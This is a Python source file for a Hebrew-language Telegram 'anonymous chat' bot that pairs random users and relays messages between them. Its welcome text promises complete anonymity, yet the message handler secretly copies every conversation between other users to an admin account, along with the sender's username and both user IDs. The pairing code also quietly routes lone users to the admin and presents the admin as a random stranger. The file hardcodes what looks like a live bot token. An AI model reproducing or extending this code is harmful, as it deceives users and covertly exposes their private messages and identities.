import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# הגדרות
TOKEN = "8799447400:AAEah-A0AUzq2h0bdAugdhVMJYt2MmP-yrg"
ADMIN_ID = 7622681013

# ניהול מצב
waiting_users = []  
active_chats = {}   

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# פונקציה לקבלת שם תצוגה נוח (Username או שם פרטי)
def get_user_display(user):
    if user.username:
        return f"@{user.username}"
    return f"{user.first_name} (ללא יוזרניים)"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = (
        "ברוך הבא לאנונימיבוט! 😎\n\n"
        "כאן תוכלו לדבר עם משתמשים רנדומלים באנונימיות מוחלטת.\n\n"
        "פקודות:\n"
        "/chat - התחל צ'אט אנונימי 📱\n"
        "/exit - סיים שיחה ⬅️\n"
        "/me - המספר מזהה שלך 🆔"
    )
    await update.message.reply_text(welcome_text)

async def find_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    
    if user_id in active_chats:
        await update.message.reply_text("אתה כבר בשיחה פעילה!")
        return
    if user_id in waiting_users:
        await update.message.reply_text("מחפשים לך פרטנר...")
        return

    if waiting_users:
        partner_id = waiting_users.pop(0)
        active_chats[user_id] = partner_id
        active_chats[partner_id] = user_id
        
        await context.bot.send_message(user_id, "נמצא משתמש! אפשר להתחיל לדבר.")
        await context.bot.send_message(partner_id, "נמצא משתמש! אפשר להתחיל לדבר.")
    else:
        # אם אין אף אחד, נבדוק אם לחבר למנהל
        if ADMIN_ID not in active_chats and user_id != ADMIN_ID:
            active_chats[user_id] = ADMIN_ID
            active_chats[ADMIN_ID] = user_id
            await update.message.reply_text("נמצא משתמש! אפשר להתחיל לדבר.")
            await context.bot.send_message(ADMIN_ID, f"לא נמצא משתמש פנוי. המשתמש {get_user_display(update.message.from_user)} הופנה אליך.")
        else:
            await update.message.reply_text("לא נמצא משתמש פנוי נא לנסות שוב")

async def exit_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id in active_chats:
        partner_id = active_chats.pop(user_id)
        active_chats.pop(partner_id, None)
        await update.message.reply_text("השיחה הסתיימה.")
        await context.bot.send_message(partner_id, "המשתמש השני עזב את השיחה.")
    else:
        await update.message.reply_text("אתה לא בשיחה כרגע.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    
    if user_id in active_chats:
        partner_id = active_chats[user_id]
        
        # ניטור למנהל עם שם משתמש
        if user_id != ADMIN_ID and partner_id != ADMIN_ID:
            sender_name = get_user_display(update.message.from_user)
            # בשביל שם המקבל, נצטרך את המידע שלו (בגרסה פשוטה זו נציג רק ID למקבל או שנשמור שמות בזיכרון)
            monitor_header = f"🕵️ **ניטור שיחה:**\nשולח: {sender_name} (ID: {user_id})\nאל פרטנר ID: {partner_id}\n---"
            await context.bot.send_message(ADMIN_ID, monitor_header)
            await update.message.copy(ADMIN_ID)

        # שליחת ההודעה (טקסט, תמונה, קובץ, קול וכו') לצד השני
        try:
            await update.message.copy(partner_id)
        except Exception as e:
            logging.error(f"Error copying message: {e}")
    else:
        await update.message.reply_text("שלח /chat כדי להתחיל לדבר!")

async def show_me(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"המספר הסידורי שלך 🆔: {update.message.from_user.id}")

def main():
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chat", find_chat))
    app.add_handler(CommandHandler("exit", exit_chat))
    app.add_handler(CommandHandler("me", show_me))
    
    # תומך בכל סוגי ההודעות (טקסט וקבצים)
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_message))
    
    print("הבוט של Rafael Digital רץ...")
    app.run_polling()

if __name__ == "__main__":
    main()

